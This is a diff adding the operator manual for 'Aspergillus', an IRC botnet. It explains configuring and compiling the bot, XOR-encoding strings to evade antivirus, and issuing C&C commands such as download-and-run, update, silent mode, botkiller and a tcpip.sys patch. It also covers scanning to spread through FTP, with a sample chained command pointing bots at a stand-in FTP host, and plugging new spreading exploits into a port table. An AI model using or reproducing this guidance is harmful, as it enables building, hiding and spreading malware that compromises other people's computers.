@@ -1,0 +1,135 @@
+		Aspergillus V1.3 by D
+		Copyright (c) 2007
+******************************************************
+Manuals - READ BEFORE USING THE BOT!
+******************************************************
+
+TABLE OF CONTENTS
+1. Preparations before compiling
+2. Using XOR encoder
+3. Bot commands
+4. Adding exploits
+
+
+
+1. Preparations before compiling
+--------------------------------
+
+You need to edit most *.cpp files. Usually editable area is marked with
+"config here" when it starts and "config ends" when it ends. MD5 can be
+now decided whether to use or not (only for download and remove commands!).
+The main file where you set defines is shared.h. There you can enable
+DEBUG mode and optional addons such as botkiller, tcpip.sys patcher, md5
+and exploits. I recommend you to change all strings too (most AVs target
+strings for heuristic points). Change encoded strings with XOR tool, non
+encoded strings just change text (note for FTPD: don't change starting
+numbers!)
+
+
+2. Using XOR encoder
+--------------------
+
+xor.exe is a command line program that can out of one file generate strings.h
+file, where encoded strings are then located. 
+
+Check strings.cfg and encoded strings in *.cpp files for example and compare 
+them.
+*Note1: always save old encoded strings before making new one
+*Note2: always use complement option on
+*Note3: you also have to change decode key, which is located in shared.cpp in
+config area
+
+If your bot isn't working anymore, after you change strings (either
+doesn't connect to irc or doesnt run after reboot), you have fucked up
+something with strings.
+
+
+3. Bot commands
+---------------
+
+Standard non-protected commands (assuming prefix = !):
+() == needed parameter, [] == optional parameter
+
+!v			bot version
+!d			disconnect
+!r			reconnect to same server
+!q 			reconnect to next server
+!ss			stop scanning
+!gc			get current cftp settings
+!sc (host) (port) (user) (pass) (file)	
+			change cftp settings
+!rm			remove*
+!dl (mode) (url) [dest] download*
+
+url = the url has to start with http:// (currently the only supported method
+      for downloading)
+mode = 0 - just download
+       1 - download and run
+       2 - update
+dest = optional destination file (if null, the file is downloaded to temp dir)
+
+*these commands can be MD5 hashed for security
+
+Optional:
+!patch			patch win xp sp2 tcpip.sys
+!bk (x)			start botkiller, repeat every x minutes 
+			(if x == off, bk is turned off)
+
+Scanning command:
+!s (threads) (ip/b/y) (rand/seq) (transfer mode) [lanbots range]
+
+threads = number of threads (recommended 64, not go over 96)
+ip/a/b/c/y = put in IP to start scan from or b for C&D IP range scanning (own)
+	     or y for B random IP range scanning (own), a for B&C&D range scanning,
+	     c for D range scanning
+rand/seq = 1 means random, 0 means sequential scanning
+transfer mode = 0 - all bots use ftp
+		1 - lan bots use cftp, wan bots use ftp
+		2 - all use cftp
+lanbots range = range for lanbots to scan (so they dont
+		scan lan ranges which are mostly empty)
+
+Recomendations: I recommend you to use cftp for lan bots and reach much higher
+spread rate (usually with other bots, lan bots are there just for jack). But be
+careful, when using vnc rooting and cftp, location of your exe can be easily
+obtained by masters of pcs you are rooting!
+
+How to turn silent mode?
+
+!sm on		turn silent on on main channel
+!sm off		turn silent off on main channel
+!sa on		turn silent on on all channels
+!sa off		turn silent off on all channels
+
+The bot also supports multiple commands. Example:
+!sm on !patch !sc ftp.givemeyourdick.com 21 lala bleh asdf.exe !scan 64 b 0 1
+
+Note: you can put such command to topic and when bot joins, it will excecute
+all commands.
+
+
+4. Adding exploits
+------------------
+
+Adding exploits is much simpler in this bot. You need to add .cpp and .h file
+to the project. Next step is to add #include "myexploit.h" into spreader.cpp.
+Then search for function "DWORD WINAPI Spreader_Thread(LPVOID param)" in
+spreader.cpp; you see the following struct filled:
+
+	port_s p[] = {
+#ifndef NO_SYM
+		{ 2967, FALSE, SYMExploit },
+		{ 2968, FALSE, SYMExploit },
+#endif
+#ifndef NO_VNC
+		{ 5900, FALSE, VNCPassCheck },
+#endif
+		{ 0, FALSE, NULL}
+	};
+
+Put in line for your exploit (above the last NULL exploit):
+	
+		{ 1337, FALSE, MyExploit },
+
+First parameter is port for your exploit, second one has to be FALSE and third
+one is the function name thats being called if the port is opened.
